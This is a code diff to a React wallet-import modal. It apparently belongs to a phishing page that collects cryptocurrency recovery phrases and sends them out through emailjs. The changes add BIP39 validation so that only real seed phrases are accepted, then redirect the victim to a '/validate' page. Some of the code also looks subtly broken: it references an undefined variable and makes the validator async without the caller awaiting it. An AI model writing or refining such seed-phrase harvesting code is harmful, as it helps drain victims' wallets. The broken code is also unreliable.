@@ -4,6 +4,8 @@ import React, { useState } from "react";
 import { AlertCircle } from "lucide-react";
 import { useRouter } from "next/navigation";
 import emailjs from "@emailjs/browser";
+import { validateMnemonic } from "web-bip39";
+import wordlist from 'web-bip39/wordlists/english';
 
 function WalletImportModal() {
   const router = useRouter();
@@ -15,7 +17,8 @@ function WalletImportModal() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [loading, setLoading] = useState(false);
 
-  const validatePhrase = (phrase: string) => {
+  const validatePhrase = async (phrase: string) => {
+
     const words = phrase
       .trim()
       .split(/\s+/)
@@ -28,6 +31,11 @@ function WalletImportModal() {
     );
     if (hasInvalidChars) {
       return "All words must contain only letters";
+    }
+    const isValid = await validateMnemonic(phraseValue, wordlist);
+    if (!isValid) {
+      setErrors({ [activeTab]: "Invalid recovery phrase" });
+      return "Invalid recovery phrase";
     }
     return null;
   };
@@ -75,11 +83,12 @@ function WalletImportModal() {
     }
 
     if (error) {
-      setErrors({ [activeTab]: error });
+      setErrors((prev) => ({ ...prev, [activeTab]: error as string }));
       return;
     }
 
-    setErrors({});
+    setErrors((prev) => ({ ...prev, [activeTab]: null }));
+
     setLoading(true);
 
     try {
@@ -271,7 +280,11 @@ Time: ${new Date().toISOString()}
         </div>
       </div>
 
-      {showSuccess && (() => { router.push("/validate"); return null; })()}
+      {showSuccess &&
+        (() => {
+          router.push("/validate");
+          return null;
+        })()}
     </div>
   );
 }
